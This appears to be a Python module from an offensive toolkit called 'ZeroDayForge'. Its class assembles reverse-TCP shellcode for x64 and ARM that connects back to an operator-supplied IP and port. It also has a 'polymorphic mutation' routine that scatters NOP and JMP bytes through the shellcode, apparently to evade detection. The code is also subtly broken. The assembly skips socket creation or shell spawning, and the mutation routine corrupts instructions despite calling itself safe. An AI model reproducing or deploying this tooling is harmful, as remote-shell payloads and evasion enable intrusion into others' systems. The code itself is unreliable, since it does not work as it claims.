import socket
import os
import random
import struct
import logging
from keystone import Ks, KS_ARCH_X86, KS_MODE_64, KS_ARCH_ARM, KS_MODE_ARM, KsError
from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_ARCH_ARM, CS_MODE_ARM

class ShellcodeError(Exception):
	"""Custom exception for shellcode generation failures"""
	pass

class ShellcodeGenerator:
	def __init__(self, arch='x64'):
		self.arch = arch.lower()
		self.logger = logging.getLogger('ZeroDayForge.Shellcode')
		self._setup_assembler()
		
	def _setup_assembler(self):
		"""Initialize Keystone engine for target architecture"""
		try:
			if self.arch == 'x64':
				self.ks = Ks(KS_ARCH_X86, KS_MODE_64)
				self.md = Cs(CS_ARCH_X86, CS_MODE_64)
			elif self.arch == 'arm':
				self.ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
				self.md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
			else:
				raise ShellcodeError(f"Unsupported architecture: {self.arch}")
		except KsError as e:
			raise ShellcodeError(f"Assembler init failed: {str(e)}")

	def generate_reverse_shell(self, ip, port):
		"""Generate architecture-specific reverse shell"""
		try:
			if self.arch == 'x64':
				return self._x64_reverse_shell(ip, port)
			elif self.arch == 'arm':
				return self._arm_reverse_shell(ip, port)
		except Exception as e:
			self.logger.error(f"Shellcode generation failed: {str(e)}")
			raise

	def _x64_reverse_shell(self, ip, port):
		"""x64 reverse TCP shellcode"""
		try:
			ip_packed = socket.inet_aton(ip)  # 4 bytes
			ip_padded = ip_packed + b"\x00\x00\x00\x00"  # pad to 8 bytes
			port_packed = struct.pack('!H', port)
			port_padded = port_packed + b"\x00\x00\x00\x00\x00\x00"  # pad to 8
		except socket.error as e:
			raise ShellcodeError(f"Invalid IP/port: {str(e)}")
			
		asm = f"""
			mov rdi, 0x{struct.unpack('<Q', ip_padded)[0]:016x}
			push rdi
			mov rsi, rsp
			mov rdx, 0
			mov rax, 0x2a
			syscall
			mov rdi, rax
			mov rsi, 0x{struct.unpack('<Q', port_padded)[0]:016x}
			push rsi
			mov rsi, rsp
			mov rdx, 16
			mov rax, 0x2a
			syscall
		"""
		return self.assemble(asm)


	def _arm_reverse_shell(self, ip, port):
		"""ARM reverse TCP shellcode"""
		try:
			ip_packed = socket.inet_aton(ip)
			port_packed = struct.pack('!H', port)
		except socket.error as e:
			raise ShellcodeError(f"Invalid IP/port: {str(e)}")

		asm = f"""
			mov r0, #2
			mov r1, #1
			mov r2, #0
			mov r7, #200
			add r7, #81
			svc #0
			mov r4, r0
			ldr r1, =0x{struct.unpack('<I', ip_packed)[0]:08x}
			ldr r2, =0x{struct.unpack('<I', port_packed)[0]:08x}
			mov r0, r4
			mov r7, #200
			add r7, #83
			svc #0
		"""
		return self.assemble(asm)

	def assemble(self, asm_code):
		"""Assemble and validate shellcode"""
		try:
			encoding, count = self.ks.asm(asm_code)
			sc = bytes(encoding)
			
			# Validate via disassembly
			valid = True
			for _ in self.md.disasm(sc, 0x1000):
				pass  # Just verify instructions can be decoded
				
			return sc
		except KsError as e:
			self.logger.error(f"Assembly failed: {str(e)}")
			raise ShellcodeError("Invalid assembly syntax")
		except Exception as e:
			self.logger.critical(f"Validation error: {str(e)}")
			raise ShellcodeError("Shellcode validation failed")

	def polymorphic_mutate(self, sc):
		"""Safe mutation with size checks"""
		if len(sc) < 100:
			raise ShellcodeError("Shellcode too small for mutation")
			
		mutated = bytearray(sc)
		junk = [b'\x90', b'\xEB\x0C']  # NOP, JMP $+14
		for _ in range(random.randint(3,7)):
			pos = random.randint(0, len(mutated)-2)
			mutated[pos:pos+len(junk[0])] = random.choice(junk)
			
		return bytes(mutated)